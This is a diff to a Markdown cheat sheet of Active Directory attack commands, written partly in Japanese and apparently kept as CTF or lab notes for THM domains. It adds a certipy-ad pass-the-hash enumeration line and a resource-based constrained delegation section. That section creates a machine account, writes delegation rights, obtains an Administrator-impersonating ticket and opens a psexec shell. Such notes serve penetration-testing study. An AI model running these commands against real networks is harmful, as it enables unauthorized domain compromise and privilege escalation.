@@ -303,6 +303,8 @@ runas /user:lunar.eruca.com\<username of DA> cmd.exe
 source ~/certipy-venv/bin/activate
 
 certipy-ad find -u name@local.thm -p 'pass' -dc-ip $TARGET -vulnerable
+
+certipy-ad find -u name@local.thm -hashes <hash> -dc-ip $TARGET -vulnerable
 ```
 
 ## Kerberos Constrained Delegation (S4U) Abuse
@@ -330,4 +332,24 @@ $ wmiexec.py THM.CORP/Administrator@HAYSTACK.THM.CORP -k -no-pass
 １．Administrator が DARLA_WINTERS にアクセスする形のチケットを（DARLA_WINTERS が）要求
 ２．DARLA_WINTERS が Administrator の代理として cifs/HAYSTACK にアクセスすることを要求（そのときに1のチケットを提示する）
 ３．Administrator が HAYSTACK の CIFS にアクセスするための正式なチケット（TGS）が発行される
+```
+
+## Resource-Based Constrained Delegation (RBCD)
+
+あるユーザーがマシンアカウントに対してGenericWriteを持つ場合。
+
+```sh
+# 例: 攻撃用コンピュータ 'ATTACKVM$' を作成
+addcomputer.py -method SAMR -dc-ip <DC-IP> -computer-name 'ATTACKVM' -computer-pass 'Password123!' 'domain/user:password'
+
+# ATTACKVM の権限を VICTIM-PC に付与
+rbcd.py -action write -delegate-from 'ATTACKVM$' -delegate-to 'VICTIM-PC$' -dc-ip <DC-IP> 'domain/user:password'
+
+# Administrator として CIFS サービスのチケットを取得
+# /etc/hosts に追加していないとエラーが出る。エラーの内容をよく見ること。
+getST.py -spn 'cifs/VICTIM-PC.domain.local' -impersonate 'Administrator' 'domain/ATTACKVM$:Password123!'
+
+# チケットを使用してログイン
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass 'domain/Administrator@VICTIM-PC.domain.local'
 ```
